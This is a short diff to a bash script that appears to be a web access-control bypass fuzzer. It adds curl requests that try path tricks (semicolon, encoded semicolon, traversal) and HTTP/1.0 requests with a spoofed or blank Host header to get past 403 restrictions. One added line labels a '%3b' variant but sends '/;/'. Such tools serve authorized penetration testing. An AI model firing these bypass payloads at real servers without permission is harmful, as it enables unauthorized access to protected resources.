@@ -148,6 +148,8 @@ function payload_Between(){
     output "${1}/../${2}"                   $(curl_wapper "${1}/../${2}") &
     output "${1}/..;/${2}"                  $(curl_wapper "${1}/..;/${2}") &
     output "${1}/..\\${2}"                  $(curl_wapper "${1}/..\\${2}") &
+    output "${1}/;${2}"                     $(curl_wapper "${1}/;/${2}") &
+    output "${1}/%3b${2}"                   $(curl_wapper "${1}/;/${2}") &
     output "${1}/;/${2}"                    $(curl_wapper "${1}/;/${2}") &
     output "${1}/%0a${2}"                   $(curl_wapper "${1}/%0a${2}") &
 
@@ -221,6 +223,8 @@ function payload_Header(){
 	wait
 	output "${METHOD} ${FULL_URL} HTTP/1.1 \t Host: 127.0.0.1" 			$(curl_wapper -H "Host: 127.0.0.1" --request-target  "${FULL_URL}" $FULL_URL) &
 	output "${METHOD} http://127.0.0.1/${rewrite_url} HTTP/1.1" 		$(curl_wapper --request-target  "http://127.0.0.1/${rewrite_url}" $FULL_URL) &
+	output "${METHOD} $FULL_URL HTTP/1.0" 		$(curl_wapper -H "Accept:" -H "Host:"  -H "User-Agent:" --http1.0 --request-target  $FULL_URL $FULL_URL) &
+	output "${METHOD} http://127.0.0.1/${rewrite_url} HTTP/1.0" 		$(curl_wapper -H "Accept:" -H "Host:"  -H "User-Agent:" --http1.0 --request-target  "http://127.0.0.1/${rewrite_url}" $FULL_URL) &
 	wait
 }
 
